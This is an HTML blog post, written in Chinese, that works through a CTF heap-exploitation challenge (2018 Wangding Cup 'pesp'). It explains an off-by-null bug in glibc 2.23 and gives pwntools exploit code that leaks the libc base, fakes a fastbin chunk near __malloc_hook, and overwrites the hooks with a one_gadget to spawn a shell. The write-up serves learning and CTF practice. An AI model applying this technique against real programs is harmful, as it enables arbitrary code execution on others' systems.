@@ -1,0 +1,392 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="1.还是之前的2018网鼎杯的pesp题目。这里假设没有堆溢出，有PIE保护，无法劫持got表。只使用0字节溢出漏洞来获取libc地址，再根据得到的libc地址来更改malloc_hook和realloc_hook里面保存的地址为one_gadget，一步getshell。(realloc_hook为onegadget，malloc_hook为__libc_realloc函数中调整栈帧的地方) 2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pesp_off-by-null">
+<meta property="og:url" content="http://pig-007.github.io/2021/08/14/pesp_off-by-null/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="1.还是之前的2018网鼎杯的pesp题目。这里假设没有堆溢出，有PIE保护，无法劫持got表。只使用0字节溢出漏洞来获取libc地址，再根据得到的libc地址来更改malloc_hook和realloc_hook里面保存的地址为one_gadget，一步getshell。(realloc_hook为onegadget，malloc_hook为__libc_realloc函数中调整栈帧的地方) 2">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536207.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536488.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537434.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536075.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537426.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536542.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536192.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536822.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191538482.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536213.jpeg">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536275.jpeg">
+<meta property="article:published_time" content="2021-08-14T05:40:30.000Z">
+<meta property="article:modified_time" content="2021-08-19T07:38:25.973Z">
+<meta property="article:author" content="PIG-007">
+<meta property="article:tag" content="off-by-null">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536207.jpeg"><title>pesp_off-by-null | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2021/08/14/pesp_off-by-null/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">pesp_off-by-null</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><p>1.还是之前的2018网鼎杯的pesp题目。这里假设没有堆溢出，有PIE保护，无法劫持got表。只使用0字节溢出漏洞来获取libc地址，再根据得到的libc地址来更改malloc_hook和realloc_hook里面保存的地址为one_gadget，一步getshell。(realloc_hook为onegadget，malloc_hook为__libc_realloc函数中调整栈帧的地方)</p>
+<p>2.先梳理一下0字节溢出漏洞，一般的chunk改内容都是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">read(0, chunk_ptr, size);</span><br></pre></td></tr></table></div></figure>
+
+<p>这样就只能输入size这么大的内容，但是这道题中，在add函数中和change函数中：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536207.jpeg" alt="img"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536488.jpeg" alt="img"></p>
+<p>可以看到给chunk添加内容的语句都是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">*(itemlist[i].cont + read(0, itemlist[i].cont, len)) = 0;// off by null</span><br></pre></td></tr></table></div></figure>
+
+<p>这样当我们将chunk内容顶满之后，程序会将chunk指针最后部分再溢出一个字节赋值为0，这就是off-by-null。</p>
+<p>由于scanf函数会在末尾自动补\x00，这其实也是一种off-by-null，</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">char buf[10];</span><br><span class="line">scanf(&quot;10%s&quot;,buf);</span><br></pre></td></tr></table></div></figure>
+
+<p>▲free源码：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((long ) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>也就是如果当前chunk的IN_USE位为0，那么就根据当前chunk的pre_size位，找到前一个chunk_pre，将chunk_pre的size位改成size+pre_size，通过Unlink取出chunk_pre，准备合并。(之后的检查代码会再循环，也就是再看chunk_pre的IN_USE位是不是0来判断要不要再向上合并，这里不重要)</p>
+<p>所以如果我们通过off-by-null，溢出0到chunk_next的size位中的IN_USE位，那么当前chunk就会被标记为Free，这样在Free(chunk_next)时，就会将chunk和chunk_next合并。如果我们又更改了chunk_next的pre_size位，使它变得更大，那么就可以向上合并更大的chunk块。这就是off-by-null的利用方法，这题中如下：</p>
+<p>(需要注意的是，由于溢出的是一个字节而不是一个Bit，所以size一般都设置为0xf0，从而使size位变成0x101，溢出之后进而变成0x100。但如果size最开始设置为0x20，size位就是0x30，溢出0字节就会变成0x00，那样程序照样崩溃。)</p>
+<p>(1)先申请四个chunk，分别为chunk0,chunk1,chunk2,chunk3。(chunk3防止合并用)</p>
+<p>(2)然后free掉chunk0，(这里chunk0需要足够大，一般得大于0x80，也就是MAX_fastbins)，使其进入unsortedbins中。(这里必须free掉chunk0，不然之后修改掉chunk2的pre_size位时，然后free掉chunk2时，程序依据pre_size来判断是否合并时，发现chunk0仍旧处于使用当中，但pre_size包含了chunk0，就会造成程序崩溃)</p>
+<p>(3)修改chunk1的最后八个字节，也就是chunk2的pre_size位，使得chunk2的pre_size位的大小为chunk0_size+chunk1_size。</p>
+<p>(4)free掉chunk2，使得chunk0,chunk1,chunk2三个chunk作为一个整体被合并之后放入到unsortedbins中，调试过程可以发现，chunk0的size位被修改成了sizeof(chunk0+chunk1+chunk2)。但是这里实际情况中，chunk1并没有被释放，只是它的内存处在被释放的内存中间，依然可以通过chunk1的指针来操作。也就是在这个程序中依旧可以进行edit来修改chunk1，或者show来打印chunk1。</p>
+<p>(5)再次申请chunk0大小，这样就会割裂unsortedbins中的remainder为chunk0+new_remainder，把chunk0申请回来，剩下的new_remainder依旧放在unsortedbins中。在unsortedbins中的remainder有个特点，就是该chunk的fd和bk一定指向unsortedbins链表头部，(如果有多个remainder，那么顺序类似于smallbins，依旧可以使用第一个chunk的bk来获取unsortedbins链表头部)</p>
+<p>(6)那么现在unsortedbins中有chunk1和chunk2，而chunk1的fd和bk都指向unsortedbins链表头部，并且在程序中chunk1仍旧处于使用状态，fd和bk就是chunk1的data部分。所以show函数就可以打印出chunk1的data部分，从而打印出fd和bk指向的unsortedbins头部链表地址。又由于unsortedbins处在main_arena+0x58位置，而main_arena相对于libc基地址的偏移是固定的，为0x3c4b20(不同glibc版本可能不同，这是libc2.23的)，所以这也就间接泄露出了libc基地址。</p>
+<p>▲查询main_arena方法：</p>
+<p>①工具查询：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/coldwave96/libcoffset%EF%BC%9A" >https://github.com/coldwave96/libcoffset：</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>②IDA查询：main_arena存储在libc.so.6文件的.data段，使用IDA打开libc文件，然后搜索函数malloc_trim()</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537434.jpeg" alt="img"></p>
+<p>3.现在有了libc基地址，那么接下来就考虑修改mallo_hook和realloc_hook的值。同样使用0字节溢出漏洞，伪造fakechunk为mallo_hook地址，修改fakechunk从而修改malloc_hook和realloc_hook。这里先忽略上面的，程序中的索引会不太一样。攻击思路如下：</p>
+<p>(1)先申请一个较大的chunk，防止和上面的合并</p>
+<p>(2)之后的操作方法类似，先申请四个chunk，分别为chunk0,chunk1,chunk2,chunk3。(chunk3防止合并用)</p>
+<p>(3)free掉chunk0，使其进入unsortedbins中。修改chunk1的最后八个字节，也就是chunk2的pre_size位，使得chunk2的pre_size位的大小为chunk0_size+chunk1_size。</p>
+<p>(4)free掉chunk2，使得chunk0,chunk1,chunk2三个chunk作为一个整体被合并之后放入到unsortedbins中。再free掉chunk1，使其进入fastbins中。这样chunk1即在fastbins中，也处在unsortedbins中。</p>
+<p>(5)申请一个特殊大小的chunk块，最小为chunk0_size+0x20，使其的data部分足够大，能够修改掉chunk1的fd位，将chunk1的fd位指向fakechunk，由于需要从size位覆盖到fd，所以需要伪造合法的size，为chunk1_size。</p>
+<p>(6)申请两个chunk1大小的chunk_a，chunk_b，这样第一次申请的chunk_a就是从fastbins中回来的chunk1。而chunk_b就是chunk1的fd指向的fakechunk。这样如果将fakechunk放在realloc_hook之前，那么就可以修改掉realloc_hook和malloc_hook，使得realloc_hook指向one_gadget，而malloc_hook指向__libc_libc函数中的某个可以控制栈帧的地址，从而满足gadget条件来getshell。</p>
+<p>4.开始编写exp，增删改查函数就不说了:</p>
+<p>(1)获取libc基地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0xf0,&#x27;0&#x27;*0xf0)</span><br><span class="line">add(0x68,&#x27;1&#x27;*0x68)#trigger 0ff-by-null</span><br><span class="line">add(0xf0,&#x27;2&#x27;*0xf0)</span><br><span class="line">add(0x10,&#x27;3&#x27;*0x10)</span><br><span class="line">#chunk0,chunk1,chunk2,chunk3(防止合并)</span><br><span class="line"></span><br><span class="line">delete(0)#防止程序崩溃</span><br><span class="line">edit(1,0x68,flat(&#x27;1&#x27;*0x60,0x170))</span><br><span class="line">#修改chunk2的pre_size，使得chunk0,chunk1,chunk3手牵手进入unsortedbins中</span><br><span class="line">delete(2)</span><br><span class="line">#触发chunk2的pre_size作用</span><br><span class="line"></span><br><span class="line">#关键就在这个add，目的就是将unsortedbins的链表头部放到chunk1的fd和bk位</span><br><span class="line">add(0xf0,&#x27;x&#x27;*0x10)</span><br><span class="line"></span><br><span class="line">#现在就可以打印chunk1来获取unsortedbins链表的头部地址，从而计算得到libc地址</span><br><span class="line">show()</span><br><span class="line">libc_address = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ]+&#x27;\0\0&#x27;)-0x3c4b78</span><br><span class="line">print(&quot;libc @ &#123;:#x&#125;&quot;.format(libc_address))</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)伪造fakechunk：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0x160,&#x27;4&#x27;*0x160)</span><br><span class="line">#第一个chunk防止合并加程序崩溃</span><br><span class="line"></span><br><span class="line">add(0xf0,&#x27;a&#x27;*0xf0)</span><br><span class="line">add(0x68,&#x27;b&#x27;*0x68)</span><br><span class="line">add(0xf0,&#x27;c&#x27;*0xf0)</span><br><span class="line">add(0x10,&#x27;d&#x27;*0x10)</span><br><span class="line">#四个chunk，套路一样。由于程序编写原因，所以索引变成chunk4,chunk5,chunk6,chunk7,对应上面的chunk0,chunk1,chunk2,chunk3。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(4)#防止程序崩溃</span><br><span class="line">edit(5,0x68,flat(&#x27;b&#x27;*0x60,0x170))</span><br><span class="line">#修改chunk2的pre_size，使得chunk0,chunk1,chunk3手牵手进入unsortedbins中</span><br><span class="line">delete(6)</span><br><span class="line">#触发chunk6的pre_size作用</span><br><span class="line"></span><br><span class="line">delete(5)</span><br><span class="line">add(0x120,flat(&#x27;A&#x27;*0xf8,0x70,(libc_address+0x3c4aed)))</span><br><span class="line">#使得chunk5进入fastbins，之后修改其fd位，创造一个fakechunk进入fastbins。这里的fakechunk_addr就是libc_address+0x3c4aed。这里的0x70写成0x71也是一样的，因为之后是malloc，不会管chunk的IN_USE位，也就是P位。</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)申请获得fakechunk，同时修改该fakechunk，劫持malloc_hook和realloc_hook。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0x68,&#x27;x&#x27;*0x10)</span><br><span class="line">add(0x68,flat(&#x27;\0&#x27;*11,(libc_address+one_gadget),(libc_address+16+libc.sym[&quot;__libc_realloc&quot;])))</span><br></pre></td></tr></table></div></figure>
+
+<p>(4)随便申请一个chunk即可getshell，但是这里不要使用之前我们定义的add函数，因为程序一旦call malloc即可getshell，即运行到输入长度即可，但是我们的add函数中一直运行到输入内容才结束，会导致程序卡住，所以应该是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)</span><br><span class="line">io.sendlineafter(&quot;:&quot;,&quot;anything&quot;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>5.这里需要很多调试的步骤：</p>
+<p>(1)从最开始打算伪造fakechunk时就应该知道我们的chunk大小应该设置为0x68，因为程序跑起来是0x7f开头，拿来伪造size再合适不过，这样的chunk大小是0x70。而我们又只能用0字节溢出，所以需要将chunk设置到最大，也就是0x70-0x08。</p>
+<p>(2)而0xf0可以改变，只要比fastbins_MAX大就行，那么对应的0x170也需要改变，同时也要改变0x120。</p>
+<p>(3)申请fakechunk步骤中的’\0’*11也是需要通过调试算出来，方法就是gdb查看realloc_hook-0xxx附近的内存，选择合适的可以伪造size的地址，之后通过填充padding来覆盖realloc_hook和malloc_hook。</p>
+<p>(4)onegadget相关的+16也得通过调试才能知道，这里选取的onegadget条件是[rsp+0x30]==Null。所以调试时将断点下在__libc_realloc函数上，进入__libc_realloc函数，从而一直进入到onegadget的执行代码中，如下：</p>
+<p>先下断点让程序运行到这<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536075.jpeg" alt="img"></p>
+<p>再输入ni进入:<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537426.jpeg" alt="img"></p>
+<p>这时候就可以看rsp的值了：<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536542.jpeg" alt="img"></p>
+<p>这里的rsp是0x7ffca3331eb8，rsp+0x30=0x7ffca3331ee8，对应图中的值就得是0才满足条件(这里已经计算过了，+16)</p>
+<p>▲如果从最开始进入__libc_realloc函数，进入到onegadget中之后，发现条件不满足，那么需要观察前后的值，从而决定从哪里进入__libc_realloc函数才能使得rsp满足。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536192.jpeg" alt="img"></p>
+<p>因为__libc_realloc(就是realloc)函数有一堆的push和sub操作，少一个push，那么rsp就可以下挪0x08，相当于rsp+0x08，中间还有sub rsp,xxh，相当于上挪rsp。所以决定从哪里进入realloc函数决定了onegadget的成功与否。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536822.jpeg" alt="img"></p>
+<p>而通过汇编代码可以看到，实际的onegaget是通过0x84724 mov rax,cs:__realloc_hook_ptr传进来，之后由于</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">test rax rax</span><br><span class="line">jnz  loc_84958</span><br></pre></td></tr></table></div></figure>
+
+<p>rax不为0，必定跳转loc_84958:</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191538482.jpeg" alt="img"></p>
+<p>这里才是我们选择调用进入onegadget的入口。所以之前在__libc_realloc的计算都是为了调整栈帧，不然其实如果栈帧不用调整就可以满足，那么我们可以直接将malloc_hook改成onegadget也可以直接getshell。因为__libc_malloc函数中的汇编代码也是类似的：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536213.jpeg" alt="img"></p>
+<p>而且这还是一个无条件跳转。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536275.jpeg" alt="img"></p>
+<p>可以看到有两个push,一个sub rsp,8;两个Pop。相当于只要在call malloc之前，我们的rsp+0x28==NULL即可满足onegadget的rsp+0x30==NULL的条件。当然，以上只是在Libc2.23下的，如果是其它版本的libc就可能不太一样。</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2021/08/14/pesp_off-by-null/">http://pig-007.github.io/2021/08/14/pesp_off-by-null/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/off-by-null/">off-by-null</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/08/14/pwn-kernel_Heap%E6%80%BB%E7%BB%93/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">pwn-kernel_Heap总结</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/08/14/pwn-kernel_%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/"><span class="paginator-prev__text">pwn-kernel_前置知识</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">93</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">43</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
